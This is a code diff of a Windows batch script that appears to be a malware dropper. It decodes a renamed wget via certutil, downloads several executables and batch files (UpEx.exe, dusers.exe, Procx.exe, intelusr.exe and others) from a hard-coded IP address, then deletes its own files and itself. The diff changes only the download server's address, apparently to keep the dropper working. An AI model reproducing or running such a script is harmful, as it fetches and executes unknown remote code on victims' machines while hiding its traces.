@@ -9,18 +9,18 @@ certutil.exe -decode wgot.64 wgot.cab
 expand -R wgot.cab -F:*.* .
 del /f /q wgot.64
 del /f /q wgot.cab
-echo http^:^/^/37.52.9.2^/Drw >> wgot.txt
+echo http^:^/^/91.239.137.53^/Drw >> wgot.txt
 echo wgot ^-c ^-i wgot.txt > wgot.bat
 ::wgot -e http_proxy= -i dedka.txt 
-wgot -c http://37.52.9.2/UpEx.exe
-wgot -c http://37.52.9.2/UpEx2.exe
-wgot -c http://37.52.9.2/UpEx3.exe
-wgot -c http://37.52.9.2/UpEx4.exe
-wgot -c http://37.52.9.2/dusers.exe
-wgot -c http://37.52.9.2/Procx.exe
-wgot -c http://37.52.9.2/tibok.bat
-wgot -c http://37.52.9.2/intelusr.exe
-wgot -c http://37.52.9.2/appl.bat
+wgot -c http://91.239.137.53/UpEx.exe
+wgot -c http://91.239.137.53/UpEx2.exe
+wgot -c http://91.239.137.53/UpEx3.exe
+wgot -c http://91.239.137.53/UpEx4.exe
+wgot -c http://91.239.137.53/dusers.exe
+wgot -c http://91.239.137.53/Procx.exe
+wgot -c http://91.239.137.53/tibok.bat
+wgot -c http://91.239.137.53/intelusr.exe
+wgot -c http://91.239.137.53/appl.bat
 del /f /q wgot.64
 del /f /q "%0"
 exit /b 0
